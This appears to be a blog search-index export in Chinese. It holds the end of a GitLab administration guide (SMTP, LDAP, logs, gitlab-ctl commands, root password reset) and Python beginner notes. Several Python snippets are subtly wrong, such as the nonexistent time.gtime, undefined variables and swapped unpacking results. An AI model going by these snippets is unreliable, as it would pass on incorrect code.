如果修改仓库目录，用户有权限访问，否则重新配置时会报错。 修改仓库目录后，必须将旧仓库的数据迁移到新目录下，否则相关项目会提示“没有仓库”。 123456sudo gitlab-ctl upgrade # 组件更新（可选）sudo gitlab-ctl stop # 停止服务sudo rsync -av &lt;old-dir&gt; &lt;new-dir&gt;/ # 目录同步（注意斜杠的作用）ls &lt;new-dir&gt; # 检查文件及目录层级sudo gitlab-ctl start # 启动服务sudo gitlab-ctl reconfigure # 重配置 3.2 配置邮件SMTPGitLab可以直接发送邮件，但如果内网对网络访问有限制，就需要配置内部的SMTP服务来发送邮件。 12345678910111213141516[root@test102 ~]# cat -n /etc/gitlab/gitlab.rb |grep smtp 559 ###! Docs: https://docs.gitlab.com/omnibus/settings/smtp.html 560 ###! **Use smtp instead of sendmail/postfix.** 562 # gitlab_rails['smtp_enable'] = true 563 # gitlab_rails['smtp_address'] = &quot;smtp.server&quot; 564 # gitlab_rails['smtp_port'] = 465 565 # gitlab_rails['smtp_user_name'] = &quot;smtp user&quot; 566 # gitlab_rails['smtp_password'] = &quot;smtp password&quot; 567 # gitlab_rails['smtp_domain'] = &quot;example.com&quot; 568 # gitlab_rails['smtp_authentication'] = &quot;login&quot; 569 # gitlab_rails['smtp_enable_starttls_auto'] = true 570 # gitlab_rails['smtp_tls'] = false 574 # gitlab_rails['smtp_openssl_verify_mode'] = 'none' 576 # gitlab_rails['smtp_ca_path'] = &quot;/etc/ssl/certs&quot; 577 # gitlab_rails['smtp_ca_file'] = &quot;/etc/ssl/certs/ca-certificates.crt&quot;[root@test102 ~]# 此外，也可以修改邮件的默认发送地址、显示名称等信息。 12345678910[root@test102 ~]# cat -n /etc/gitlab/gitlab.rb |grep gitlab_email 60 # gitlab_rails['gitlab_email_enabled'] = true 61 # gitlab_rails['gitlab_email_from'] = 'example@example.com' 62 # gitlab_rails['gitlab_email_display_name'] = 'Example' 63 # gitlab_rails['gitlab_email_reply_to'] = 'noreply@example.com' 64 # gitlab_rails['gitlab_email_subject_suffix'] = '' 65 # gitlab_rails['gitlab_email_smime_enabled'] = false 66 # gitlab_rails['gitlab_email_smime_key_file'] = '/etc/gitlab/ssl/gitlab_smime.key' 67 # gitlab_rails['gitlab_email_smime_cert_file'] = '/etc/gitlab/ssl/gitlab_smime.crt'[root@test102 ~]# 邮件发送测试 12345678910111213141516171819202122232425262728[root@test102 ~]# gitlab-rails console-------------------------------------------------------------------------------- GitLab: 12.5.0 (1f0ab8978ef) GitLab Shell: 10.2.0 PostgreSQL: 10.9--------------------------------------------------------------------------------Loading production environment (Rails 5.2.3)irb(main):001:0&gt; Notify.test_email('anliven@126.com','test','test').deliver_nowNotify#test_email: processed outbound mail in 1.4msSent mail to anliven@126.com (73.0ms)Date: Wed, 27 Nov 2019 15:12:58 +0800From: GitLab &lt;gitlab@192.168.16.102&gt;Reply-To: GitLab &lt;noreply@192.168.16.102&gt;To: anliven@126.comMessage-ID: &lt;5dde21fa612d4_3a1b3fcb38fcf9c0651b@test102.mail&gt;Subject: testMime-Version: 1.0Content-Type: text/html; charset=UTF-8Content-Transfer-Encoding: 7bitAuto-Submitted: auto-generatedX-Auto-Response-Suppress: All&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/REC-html40/loose.dtd&quot;&gt;&lt;html&gt;&lt;body&gt;&lt;p&gt;test&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;=&gt; #&lt;Mail::Message:70141649239780, Multipart: false, Headers: &lt;Date: Wed, 27 Nov 2019 15:12:58 +0800&gt;, &lt;From: GitLab &lt;gitlab@192.168.16.102&gt;&gt;, &lt;Reply-To: GitLab &lt;noreply@192.168.16.102&gt;&gt;, &lt;To: anliven@126.com&gt;, &lt;Message-ID: &lt;5dde21fa612d4_3a1b3fcb38fcf9c0651b@test102.mail&gt;&gt;, &lt;Subject: test&gt;, &lt;Mime-Version: 1.0&gt;, &lt;Content-Type: text/html; charset=UTF-8&gt;, &lt;Content-Transfer-Encoding: 7bit&gt;, &lt;Auto-Submitted: auto-generated&gt;, &lt;X-Auto-Response-Suppress: All&gt;&gt;irb(main):002:0&gt; irb(main):003:0&gt; exit[root@test102 ~]# 3.3 禁用创建组权限GitLab默认所有的注册用户都可以创建组，在实际使用中，通常只会给指定的少部分用户相关权限。 将/etc/gitlab/gitlab.rb中的gitlab_rails[‘gitlab_default_can_create_group’]参数设为false，然后重载配置即可。 123[root@test102 ~]# cat -n /etc/gitlab/gitlab.rb |grep &quot;create_group&quot; 70 # gitlab_rails['gitlab_default_can_create_group'] = true[root@test102 ~]# 3.4 集成OpenLDAP设置/etc/gitlab/gitlab.rb文件中关于LDAP的内容，并重载配置，然后通过“gitlab-rake gitlab:ldap:check ”命令验证是否是否能正常获取用户列表，最后重启gitlab服务。 123[root@test102 ~]# cat -n /etc/gitlab/gitlab.rb |grep &quot;LDAP Settings&quot; 296 ### LDAP Settings[root@test102 ~]# 3.5 GitLab个人中文界面登录后，点击右上角用户头像—》Settings—》Preferences—》Localization部分的Language项目—》选择“简体中文”并保存更改—》刷新页面。 4 - 日志查看123gitlab-ctl tail # 查看所有GitLab日志 gitlab-ctl tail &lt;module-name&gt; # 查看某个组件的日志gitlab-ctl tail &lt;module-name&gt;/&lt;log-name&gt; # 查看某个组件的某个类型日志 日志目录：/var/log/gitlab/ 12345678910111213141516171819202122232425262728293031[root@test102 ~]# ll /var/log/gitlab/total 0drwx------ 2 gitlab-prometheus root 47 Nov 27 13:55 alertmanagerdrwx------ 2 git root 47 Nov 27 13:53 gitalydrwx------ 2 git root 47 Nov 27 13:55 gitlab-exporterdrwx------ 2 git root 238 Nov 27 14:00 gitlab-railsdrwx------ 2 git root 6 Nov 27 13:53 gitlab-shelldrwx------ 2 git root 47 Nov 27 13:54 gitlab-workhorsedrwx------ 2 gitlab-prometheus root 47 Nov 27 13:56 grafanadrwx------ 2 root root 47 Nov 27 13:55 logrotatedrwxr-x--- 2 root gitlab-www 131 Nov 27 13:54 nginxdrwx------ 2 gitlab-prometheus root 47 Nov 27 13:55 node-exporterdrwx------ 2 gitlab-psql root 47 Nov 27 13:55 postgres-exporterdrwx------ 2 gitlab-psql root 47 Nov 27 13:53 postgresqldrwx------ 2 gitlab-prometheus root 47 Nov 27 13:55 prometheusdrwxr-xr-x 2 root root 50 Nov 27 15:04 reconfiguredrwx------ 2 gitlab-redis root 47 Nov 27 13:53 redisdrwx------ 2 gitlab-redis root 47 Nov 27 13:55 redis-exporterdrwx------ 2 git root 47 Nov 27 13:54 sidekiqdrwx------ 2 git root 99 Nov 27 13:54 unicorn[root@test102 ~]# [root@test102 ~]# ll /var/log/gitlab/nginx/total 32-rw-r--r-- 1 root root 0 Nov 27 13:54 access.log-rw-r--r-- 1 root root 30 Nov 27 13:54 config-rw-r--r-- 1 root root 0 Nov 27 13:54 current-rw-r--r-- 1 root root 0 Nov 27 13:54 error.log-rw-r--r-- 1 root root 28553 Nov 27 15:25 gitlab_access.log-rw-r--r-- 1 root root 0 Nov 27 13:54 gitlab_error.log-rw------- 1 root root 0 Nov 27 13:54 lock[root@test102 ~]# 5 - GitLab-ctl常用命令123456789gitlab-ctl reconfigure # 重载配置gitlab-ctl check-config # 检查配置并启动gitlab-ctl diff-config # 将用户配置与包可用配置进行比较gitlab-ctl status # 查看所有启动组件的进程和状态gitlab-ctl service-list # 查看所有服务gitlab-ctl stop # 停止GitLab服务gitlab-ctl start # 启动GitLab服务 gitlab-ctl restart # 重启GitLab服务 gitlab-ctl once # 如果GitLab服务已停止则启动服务，如果GitLab服务已启动则重启GitLab服务 gitlab-ctl help 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576# gitlab-ctl helpomnibus-ctl: command (subcommand)check-config Check if there are any configuration in gitlab.rb that is removed in specified versiondeploy-page Put up the deploy pagediff-config Compare the user configuration with package available configurationprometheus-upgrade Upgrade the Prometheus data to the latest supported versionremove-accounts Delete *all* users and groups used by this packagereset-grafana Reset Grafana instance to its initial state by removing the data directoryset-grafana-password Reset admin password for Grafanaupgrade Run migrations after a package upgradeGeneral Commands: cleanse Delete *all* gitlab data, and start from scratch. help Print this help message. reconfigure Reconfigure the application. show-config Show the configuration that would be generated by reconfigure. uninstall Kill all processes and uninstall the process supervisor (data will be preserved).Service Management Commands: graceful-kill Attempt a graceful stop, then SIGKILL the entire process group. hup Send the services a HUP. int Send the services an INT. kill Send the services a KILL. once Start the services if they are down. Do not restart them if they stop. restart Stop the services if they are running, then start them again. service-list List all the services (enabled services appear with a *.) start Start services if they are down, and restart them if they stop. status Show the status of all the services. stop Stop the services, and do not restart them. tail Watch the service logs of all enabled services. term Send the services a TERM. usr1 Send the services a USR1. usr2 Send the services a USR2.Backup Commands: backup-etc Backup GitLab configuration [accepts directory path]Let's Encrypt Commands: renew-le-certs Renew the existing Let's Encrypt certificatesDatabase Commands: pg-password-md5 Generate MD5 Hash of user password in PostgreSQL format pg-upgrade Upgrade the PostgreSQL DB to the latest supported version revert-pg-upgrade Run this to revert to the previous version of the database set-replication-password Set database replication passwordContainer Registry Commands: registry-garbage-collect Run Container Registry garbage collection. 6 - 问题处理修改root密码https://docs.gitlab.com/ce/security/reset_root_password.html 1234567891011121314151617181920[root@node102 ~]# gitlab-rails console -e production-------------------------------------------------------------------------------- GitLab: 12.5.0 (1f0ab8978ef) GitLab Shell: 10.2.0 PostgreSQL: 10.9--------------------------------------------------------------------------------Loading production environment (Rails 5.2.3)irb(main):001:0&gt; user = User.where(id: 1).first=&gt; #&lt;User id:1 @root&gt;irb(main):002:0&gt; user = User.find_by(email: 'admin@example.com')=&gt; #&lt;User id:1 @root&gt;irb(main):003:0&gt; user.password = 'secret_pass'=&gt; &quot;secret_pass&quot;irb(main):004:0&gt; user.password_confirmation = 'secret_pass'=&gt; &quot;secret_pass&quot;irb(main):005:0&gt; user.save!Enqueued ActionMailer::DeliveryJob (Job ID: 90526cdc-8d61-458f-bb85-bd1f2797c5b1) to Sidekiq(mailers) with arguments: &quot;DeviseMailer&quot;, &quot;password_change&quot;, &quot;deliver_now&quot;, #&lt;GlobalID:0x00007fc0b4541088 @uri=#&lt;URI::GID gid://gitlab/User/1&gt;&gt;=&gt; trueirb(main):006:0&gt; exit[root@node102 ~]#","link":"/2021/10/04/git%E5%8F%8Agithub/"},{"title":"python编程","text":"变量和简单类型单行注释和多行注释 通常而言，合理的代码注释应该占源代码的1/3左右 变量弱类型语言两个典型特征 变量无需声明即可直接赋值：对于一个不存在的变量赋值就相当于定义了一个新变量 变量的数据类型可以动态的改变：同一个变量可以一会被赋值整数值，一会为字符串 使用print函数输出变量1print(value, ..., sep=' ', end='\\n', file=sys.stdout, flush=False) value 可以输出多个变量 sep=’|’ end=’ ‘ file ```pythonf = open(“hello.txt”, “w”)print(“hello,world!”, file=f)f.close()1234567891011121314+ flush参数用于控制输出缓存，一般保持为False，以获得较好的性能### 变量的命名规则+ 标识符可以由字母、数字、下划线(_)组成，其中数字不能打头+ 标识符不能为python关键字，但可以包含关键字+ 标识符不能包含空格### python 的关键字和内置函数```pythonimport keywordkeyword.kwlist 1dir(__builtins__) 数值类型整型整型数值的四种表示形式 十进制 二进制：0b或0B开头 八进制：0o或0O开头 十六进制：0x或0X开头 为了提高数值（包括浮点型）的可读性，python3允许使用_对数值进行分隔 123one_million = 1_000_000print(one_million)price = 234_234_234 # price实际的值为234234234 浮点型表示形式： 十进制形式 科学计数形式 5.12e2 5.12E2 –&gt; 5.12x102 注：只有浮点型数值才可以用科学计数形式表示。51200为整型，512E2为浮点型 复数复数的虚部用j或J表示 1import cmath 字符串字符串和转义字符123str = '&quot;hello,my girlfriend.Let's have dinner&quot;, he said.' # ×str = '&quot;hello,my girlfriend.Let\\'s have dinner&quot;, he said.' # √# 观察颜色 拼接字符串 两个字符串写在一起，自动拼接 12str = &quot;hello,&quot; &quot;girlfriend&quot;print(str) +号拼接 1234str1 = &quot;hello,&quot;str2 = &quot;girlfriend&quot;str3 = str1 + str2print(str3) repr和字符串当需要将字符串与数值进行拼接时，可以使用str()和repr()函数 12345s = &quot;这本书的价格是：&quot;price = 118print(s + p) # 报错print(s + str(p))print(s + repr(p)) 其中str是python内置的函数，repr则是函数，此外repr还可以以python表达式的形式来表示值 12345str = &quot;hello, my girlfriend&quot;print(str)print(repr(str))&gt;&gt;&gt; hello, my girlfriend&gt;&gt;&gt; 'hello, my girlfriend' 带引号的字符串——字符串的python的表达式形式 交互式解释器中，python会自动使用repr 使用input和raw_input获得用户输入input函数总是返回一个字符串 长字符串1234str = '''hello,mygirlfriendlet's have dinner''' 123str = &quot; \\hello,mygirlfriend \\let's have dinner&quot; 12num = 20 + 3 / 4 + \\ 2 * 3 原始字符串原始字符串以r开头，且不会把\\当成特殊字符 1234&gt;&gt;&gt; print('&quot;let\\'s go&quot;, she said')&quot;let's go&quot;, she said&gt;&gt;&gt; print(r'&quot;let\\'s go&quot;, she said')&quot;let\\'s go&quot;, she said 原始字符串的结尾不能为\\ 需要的话可以使用字符串拼接方法 字节串（bytes）字符串转换成bytes对象 字符串内容都为ASCII字符，可直接在字符串之前加ｂ 调用bytes()函数，如果不指定字符集，默认为utf-8 调用字符串本身的encode()方法 1234567891011121314151617181920212223242526272829&gt;&gt;&gt; b1 = bytes()&gt;&gt;&gt; b1b''&gt;&gt;&gt; b2 = b''&gt;&gt;&gt; b2b''&gt;&gt;&gt; b3 = b'helloworld'&gt;&gt;&gt; b3b'helloworld'&gt;&gt;&gt; b3[0]104&gt;&gt;&gt; b3[2:4]b'll&gt;&gt;&gt; b4 = b'你好世界'SyntaxError: bytes can only contain ASCII literal characters.&gt;&gt;&gt; b5 = bytes(&quot;helloworld&quot;, encoding = 'utf-8')&gt;&gt;&gt; b5b'helloworld'&gt;&gt;&gt; print(b5)b'helloworld'&gt;&gt;&gt; b6 = bytes(&quot;你好世界&quot;, encoding = 'utf-8')&gt;&gt;&gt; b6b'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\\xe4\\xb8\\x96\\xe7\\x95\\x8c' &gt;&gt;&gt; b7 = &quot;你好世界&quot;.encode('utf-8')&gt;&gt;&gt; b7b'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\\xe4\\xb8\\x96\\xe7\\x95\\x8c'&gt;&gt;&gt; st = b7.decode('utf-8')&gt;&gt;&gt; st'你好世界' 深入理解字符串转义字符 转义字符 说明 \\b 退格符 \\n 换行符 \\r 回车符 \\t 制表符 \\“ 双引号 \\‘ 单引号 \\\\ 反斜线 字符串格式化python提供了“%”对各种类型的数据进行格式化输出 12price = 118print(&quot;this book costs %s yuan&quot; % price) 123name = &quot;zhangsan&quot;price = 118print(&quot;%s 's book cost %s yuan&quot; % (name, price)) 转换说明符 说明 d, i 带符号十进制整数 o 带符号八进制整数 x 带符号十六进制整数 X 带符号十六进制整数 e 科学计数法的浮点数e E 科学计数法的浮点数E f, F 十进制的浮点数 g 智能选择f或e G 智能选择F或E C 转换为单字符 r repr()转换为字符串 s str()转换为字符串 12345678910111213num = 118print(&quot;num is %6i&quot; % num)print(&quot;num is %6d&quot; % num)print(&quot;num is %6o&quot; % num)print(&quot;num is %6x&quot; % num)print(&quot;num is %6X&quot; % num)print(&quot;num is %6s&quot; % num)&gt;&gt;&gt; num is 118&gt;&gt;&gt; num is 118&gt;&gt;&gt; num is 166&gt;&gt;&gt; num is 76&gt;&gt;&gt; num is 76&gt;&gt;&gt; num is 118 此时指定了字符串的最小宽度为6，默认情况下，转换出来的字符串总是右对齐的，在python中是可以改变的 -：指定左对齐 +：表示数值总要带着符号（正数带+，负数带-） 0：表示不补充空格，补充0 注：这三个标志可以同时存在 对于浮点数，python允许指定小数点后的数字位数 对于字符串，python允许指定转换后的字符串的最大字符数 123name = &quot;zhangsan&quot;print(&quot;kuangtu is %10.5s &quot; % name)&gt;&gt;&gt; kuangtu is zhang 序列相关方法12345s[3:-5]s[5:]s[-6:]s[:5]s[:-6] 12345s = 'helloworld'print('hello' in s)len()max()min() 大小写相关方法12&gt;&gt;&gt; dir(str)&gt;&gt;&gt; help(str.title) s.title() 首字母大写 s.upper() 每个字母大写 s.lower() 每个字母小写 删除空白strip v 脱衣服; 除去，剥去; 拆卸; 剥夺; strip() 方法用于移除字符串头尾指定的字符（默认为空格）。 strip()：删除字符串前后的空白 lstrip()：删除字符串前面（左边）的空白 rstrip()：删除字符串后面（右边）的空白 1234567&gt;&gt;&gt; help(str.strip)Help on method_descriptor:strip(self, chars=None, /) Return a copy of the string with leading and trailing whitespace removed. If chars is given and not None, remove characters in chars instead. python中str不可变，故返回副本而不是原字符串的改变 注意：该方法只能删除开头或是结尾的字符，不能删除中间部分的字符。 12345str = &quot;*****this is **string** example....wow!!!*****&quot;print (str.strip( '*' )) # 指定字符串 *&gt;&gt;&gt; this is **string** example....wow!!!str = &quot;123abcrunoob321&quot;print (str.strip( '12' )) # 字符序列为 12 查找、替换相关方法 startwith()：判断字符串是否以指定子串开头 endswith()：判断字符串是否以指定子串结尾 find()：查找指定子串在字符串中出现的位置，若没找到，返回-1 index()：查找指定子串在字符串中出现的位置，若没找到，引发ValueError错误 replace()：使用指定子串替换字符串中的目标子串 translate()：使用指定的翻译映射表对字符串替换 12345678910111213141516print(s.replace('hello', 'hi', 1))intab= &quot;aeiou&quot;outtab= &quot;12345&quot;deltab= &quot;thw&quot; trantab1= str.maketrans(intab,outtab)# 创建字符映射转换表trantab2= str.maketrans(intab,outtab,deltab)#创建字符映射转换表，并删除指定字符 test= &quot;this is string example....wow!!!&quot; print(test.translate(trantab1))print(test.translate(trantab2))&gt;&gt;&gt; th3s3s str3ng2x1mpl2....w4w!!!&gt;&gt;&gt; 3s 3s sr3ng2x1mpl2....4!!! 分割、连接方法 split()：将字符串按指定分隔符分割成多个短语 join()：将多个短语连接成字符串 123456789str = &quot;Line1-abcdef \\nLine2-abc \\nLine4-abcd&quot;;print str.split( ); # 以空格为分隔符，包含 \\nprint str.split(' ', 1 ); # 以空格为分隔符，分隔成两个['Line1-abcdef', 'Line2-abc', 'Line4-abcd']['Line1-abcdef', '\\nLine2-abc \\nLine4-abcd']message = 'https://mp.csdn.net/'print(message.split(&quot;//&quot;)[1].split(&quot;/&quot;)[0].split(&quot;.&quot;))打印结果：['mp', 'csdn', 'net'] 1234567891011121314s1 = &quot;-&quot;s2 = &quot;&quot;seq = (&quot;r&quot;, &quot;u&quot;, &quot;n&quot;, &quot;o&quot;, &quot;o&quot;, &quot;b&quot;) # 字符串序列print (s1.join( seq ))print (s2.join( seq ))r-u-n-o-o-brunoob&gt;&gt;&gt;li = ['my','name','is','bob'] &gt;&gt;&gt;' '.join(li) 'my name is bob' &gt;&gt;&gt;'_'.join(li) 'my_name_is_bob' 运算符赋值运算符算数运算符位运算符 &amp;：按位与 |：按位或 ^：按位异或 ~：按位取反 &lt;&lt;：左位移运算符 ‘&gt;&gt;：右位移运算符 扩展后的赋值运算符索引运算符[] [2:8:3] 比较运算符与bool类型 is：判断两个变量使用的对象是否相同 is not：判断两个变量使用的对象是否不相同，不相同返回Tru 12345import timea = time.gtime()b = time.gtime()print(a == b) # Trueprint(a is b) # False 每次调用gtime()函数都返回不同的对象 123id(a)id(b)# 判断变量所引用对象的内存地址，计算机同一块内存在任一时刻只能存放一个对象 逻辑运算符三目运算符1True_statements if expression else False_statements python允许在三目运算符的True_statements或False_statements中放置多条语句 多条语句以英文逗号隔开：每条都会执行，返回所有返回值构成的元组 多条语句以英文逗号隔开：每条都会执行，返回第一条语句的返回值 in运算符 in not in in运算符可以判断字符串是否包含特定的子串，和序列是否包含子序列 运算符的结合性和优先级列表、元组和字典序列简介python的序列…… 创建列表和元组…… 列表和元组的通用用法通过索引使用元素…… 子序列slice [start: end: step] 加法 列表只能和列表相加 元组只能和元组相加 元组不能直接和列表相加 乘法意义：列表或元组包含的元素重复N次 123456&gt;&gt;&gt; l = (&quot;ll&quot;)&gt;&gt;&gt; type(l)&lt;class 'str'&gt;&gt;&gt;&gt; l = (&quot;ll&quot;,)&gt;&gt;&gt; type(l)&lt;class 'tuple'&gt; in运算符…… 长度、最大值和最小值一次比较每个字符的ASCII码值 序列封包和序列解包 程序将多个值赋给一个变量时，python会自动将多个值封装成元组，此为封包 程序允许将序列（元组列表等）直接赋值给多个变量，此时序列中的各元素会被依次赋值给每个变量（要求个数相等），此为解包 1234567# 封包vals = 10, 20, 30# 解包a_tuple = tuple(range(1, 10, 2))a, b, c, d, e = a_tuplea_list = ['xsad', 'dsvsvf']a_str, b_str = a_list 12345x, y, z = 10, 20, 30# 执行过程如下：xyz = 10, 20, 30x, y, z = xyz 1x, y, z = y, z, x 程序的解包时可以只解出部分变量，剩下的依然使用列表变量保存 12345678910111213# first、second保存前两个元素，rest列表包含剩下的元素first, second, *rest = range(10)print(first) # 0print(second) # 1print(rest) # [2, 3, 4, 5, 6, 7, 8, 9]# last保存最后一个元素，begin保存前面剩下的begin, *last = range(10)print(begin) # [0, 1, 2, 3, 4, 5, 6, 7, 8]print(last) # 9# first保存第一个元素，last保存最后一个，middle保存中间剩下的print(first) # 0print(middle) # [0, 1, 2, 3, 4, 5, 6, 7, 8]print(last) # 9 使用列表创建列表list()函数 tuple()函数 增加列表元素 append()函数，会形成列表中嵌套列表，嵌套元组的情形 extent()函数，追加列表中的元素而不是将列表当做一个元素 insert()函数，指定位置插入元素 删除列表元素 del语句，可以删除列表元素及变量 根据索引 可以删除列表中单个元素，也可以删除列表的中间一段 ```pythondel a_list[1: 3] # 不包含del a_list[1: -1: 2] # 不包含，间隔为2 12345+ remove()函数，根据元素的本身，只删除第一个，找不到抛出ValueError - ```python c_list.remove('csdsv') clear()方法，清空列表中所有元素 ```pythonc_list.clear()12345678910111213141516171819### 修改列表元素+ 修改元素法增加、删除元素```pythonb_list = list(range(1, 5))print(b_list)# 将第2个到第4个（不包含）元素赋值为新列表的元素b_list[1: 3] = ['a', 'b']print(b_list) # [1, 'a', 'b', 4]# 将第3个到第3个（不包含）元素赋值为新列表的元素，就是插入元素b_list[2:2] = ['x', 'y']print(b_list) # [1, 'a', 'x', 'y', 'b', 4]# 将第3个到第6个（不包含）元素赋值为空列表，就是删除元素b_list[2: 5] = []print(b_list) # [1, 'a', 4] 使用slice语法赋值时，不能使用单个值，使用字符串赋值python会自动把字符串当成序列处理，其中每一个字符都是一个元素 slice语法赋值时，如果使用step参数，则元素个数要保持一致 列表中其他常用方法 count()：用于统计列表中某个元素出现的次数 index()：用于判断某个元素在列表中出现的位置 pop()：用于将列表当做“栈”使用，实现元素出栈功能 reverse()：用于将列表中的元素反向存放 sort()：用于对列表元素排序 使用字典创建字典元组可做key，列表不能，key要求为不可变的 使用dict()函数创建字典时，可以传入多个列表或元组参数作为key-value对 1234vegetables = [('celery', 1.58), ('brocoil', 1.29), ('lettuce', 2.19)]dict3 = dict(vegetables)cars = [['BWM', 8.5], ['bens', 8.3], ['AUDI', 7.9]]dict4 = dict(cars) 1dict5 = dict(spinach = 1.39, cabbage = 2.59) 字典的基本用法 通过key访问value 通过key添加key-value对 通过key删除key-value对 通过key修改key-value对 通过key判断指定key-value对是否存在 字典的常用方法 clear()：清空字典中所有key-value对 get()：根据key获取value，若不存在，直接访问报错，get方法None update()：存在覆盖，不存在更新 items()：获取字典中所有的key-value对 keys()：获取字典中所有的key values()：获取字典中所有的value 1234567891011&gt;&gt;&gt; cars = [['BWM', 8.5], ['bens', 8.3], ['AUDI', 7.9]]&gt;&gt;&gt; carss = dict(cars)&gt;&gt;&gt; itms = carss.items()&gt;&gt;&gt; print(itms)dict_items([('BWM', 8.5), ('bens', 8.3), ('AUDI', 7.9)])&gt;&gt;&gt; print(list(itms))[('BWM', 8.5), ('bens', 8.3), ('AUDI', 7.9)]&gt;&gt;&gt; print(list(carss.keys()))['BWM', 'bens', 'AUDI']&gt;&gt;&gt; print(list(carss.values()))[8.5, 8.3, 7.9] pop()：用于获取指定key对应的value并删去此key-value popitem()：随机弹出字典中的一个key-value（总是弹出底层存储的最后一个key-value）弹出格式为元组，可使用序列解包分别接受 1k, v = cars.popitem() setdefault()：default 默认的 根据key获取value，存在则直接返回，不存在则读取默认 fromkeys()：使用给定的多个key创建字典，value默认为None，也可以指定 使用字典格式化字符串1234# 在字符串模板中使用keytemp = '书名是：%(name)s，价格是%(price)010.2f，出版社是：%(publish)s'book = {'name':'疯狂python', 'price':118, 'publish':'地摊'}print(temp % book) 流程控制顺序结构…… if分支结构使用if else分支语句时，一定要先处理包含范围更小的情形 pass语句…… 断言断言语句与if分支有些类似，它用于对一个bool表达式进行断言，如果该表达式为True，该程序可以继续向下执行；否则抛出AssertionError异常。 1234s_age = input(&quot;请输入您的年龄：&quot;)age = int(s_age)assert 20 &lt; age &lt; 80print(&quot;输入的年龄在20和80之间&quot;) assert断言的逻辑： 12if 条件为False： 程序引发AssertionError异常 循环结构while循环…… while循环遍历…… for-in循环…… for-in循环遍历…… for-in循环遍历字典字典包含三种方法： items() keys() values() for-in循环遍历字典正是基于这三种方法读取的列表进行遍历 123456for key, value in my_dict.items(): passfor key in my_dict.keys(): print(my_dict[key])for value in my_dict.values(): pass 循环使用elsepython的循环都可以定义else代码块，当循环条件为False时，程序会执行else代码块 123456count_i = 0while count_i &lt; 5: print('count_i小于5：', count_i) count_i += 1else: print('count_i大于或等于5：', count_i) 这里else相当于print 12345count_i = 0while count_i &lt; 5: print('count_i小于5：', count_i) count_i += 1print('count_i大于或等于5：', count_i) 循环的else是为了使python代码更优雅 在for循环中，else可以读取循环计数器的最后一个值 12345a_list = [330, 54, 5.68, -56.2, 'dksoji', 'dsjk']for ele in a_list: print('元素：', ele)else: print('else块值：', ele) 嵌套循环…… for表达式 列表推导式 ```pythona_range = range(10)b_list = [x * x for x in a_range if x % 2 == 0]print(b_list)1234567891011+ 生成器推导式 - ```python a_range = range(10) c_generator = (x * x for x in a_range if x % 2 == 0) for i in c_generator: print(i, end='\\t') &gt;&gt;&gt; c_generator &lt;generator object &lt;genexpr&gt; at 0x00000231A888A6D0&gt; 多循环列表推导式 ```pythone_list = [(x, y, z) for x in range(5) for y in range(4) for z in range(6)]12345- ```python a_list = [5, 56, 89, 586, 2, 4898] b_list = [5, 8, 69, 4] c_list = [(x, y) for x in a_list for b in b_list if y % x == 0] 常用工具函数 zip()：将多个列表压缩成一个zip对象（可迭代对象），且以更短列表为准 reversed()： ```python[x for x in reversed(b)]123456+ sorted()： - ```python sorted(a, reverse = True) sorted(b, key=len) 控制循环结构使用break结束循环…… 使用continue忽略本次循环剩下的语句…… 使用return结束方法return直接结束整个函数或方法，而不管return处于多少层循环 函数和lambda表达式函数入门定义函数和调用函数…… 为函数提供文档将一段字符串放在函数声明之后、函数体之前，这段字符串将被作为函数的部分，这个文档就是函数的说明文档 可以通过help函数和 __doc__属性进行查看 1234567def func(): ''' hello world! ''' passhelp(func)print(func.__doc__) 多个返回值如果python函数直接返回多个值，python会自动将多个返回值封装成元组 此外，可以通过序列解包获取多个返回值 递归函数…… 函数的参数位置参数位置参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。 调用printme()函数，你必须传入一个参数，不然会出现语法错误： 12345678910#!/usr/bin/python3 #可写函数说明def printme( str ): &quot;打印任何传入的字符串&quot; print (str) return # 调用 printme 函数，不加参数会报错printme() 以上实例输出结果： 1234Traceback (most recent call last): File &quot;test.py&quot;, line 10, in &lt;module&gt; printme()TypeError: printme() missing 1 required positional argument: 'str' 关键字参数关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。 使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。 以下实例在函数 printme() 调用时使用参数名： 12345678910#!/usr/bin/python3 #可写函数说明def printme( str ): &quot;打印任何传入的字符串&quot; print (str) return #调用printme函数printme( str = &quot;hello world&quot;) 以上实例输出结果： 1hello world 以下实例中演示了函数参数的使用不需要使用指定顺序： 1234567891011#!/usr/bin/python3 #可写函数说明def printinfo( name, age ): &quot;打印任何传入的字符串&quot; print (&quot;名字: &quot;, name) print (&quot;年龄: &quot;, age) return #调用printinfo函数printinfo( age=50, name=&quot;zhangsan&quot; ) 以上实例输出结果： 12名字: zhangsan年龄: 50 参数的默认值调用函数时，如果没有传递参数，则会使用默认参数。以下实例中如果没有传入 age 参数，则使用默认值 12345678910111213#!/usr/bin/python3 #可写函数说明def printinfo( name, age = 35 ): &quot;打印任何传入的字符串&quot; print (&quot;名字: &quot;, name) print (&quot;年龄: &quot;, age) return #调用printinfo函数printinfo( age=50, name=&quot;runoob&quot; )print (&quot;------------------------&quot;)printinfo( name=&quot;runoob&quot; ) 以上实例输出结果： 12345名字: runoob年龄: 50------------------------名字: runoob年龄: 35 未指定成为关键字参数的位置参数必须按照函数的定义位置顺序 关键字参数必须位于位置参数后面（调用和定义） 默认参数定义在形参列表后面 参数收集（个数可变的参数）可以在调用函数时传入任意多个参数 1234def functionname([formal_args,] *var_args_tuple ): &quot;函数_文档字符串&quot; function_suite return [expression] 加了星号 ***** 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。 1234567891011#!/usr/bin/python3 # 可写函数说明def printinfo( arg1, *vartuple ): &quot;打印任何传入的参数&quot; print (&quot;输出: &quot;) print (arg1) print (vartuple) # 调用printinfo 函数printinfo( 70, 60, 50 ) 以上实例输出结果： 123输出: 70(60, 50) 如果在函数调用时没有指定参数，它就是一个空元组。我们也可以不向函数传递未命名的变量。如下实例： 1234567891011121314#!/usr/bin/python3 # 可写函数说明def printinfo( arg1, *vartuple ): &quot;打印任何传入的参数&quot; print (&quot;输出: &quot;) print (arg1) for var in vartuple: print (var) return # 调用printinfo 